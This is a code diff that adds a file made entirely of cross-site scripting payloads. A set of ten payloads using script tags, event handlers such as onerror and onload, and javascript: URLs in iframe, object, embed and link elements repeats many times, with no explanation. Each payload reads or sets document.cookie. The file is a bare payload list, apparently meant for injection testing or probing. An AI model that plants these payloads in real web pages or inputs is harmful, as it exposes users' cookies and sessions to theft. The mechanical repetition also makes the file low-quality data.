@@ -1,0 +1,329 @@
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
+
+<script>document.cookie="xss=1";</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg onload="alert(document.cookie)"></svg>
+<video poster=1 onerror="alert(document.cookie)"></video>
+<body onload="alert(document.cookie)">
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+<a href="javascript:alert(document.cookie)">Click me</a>
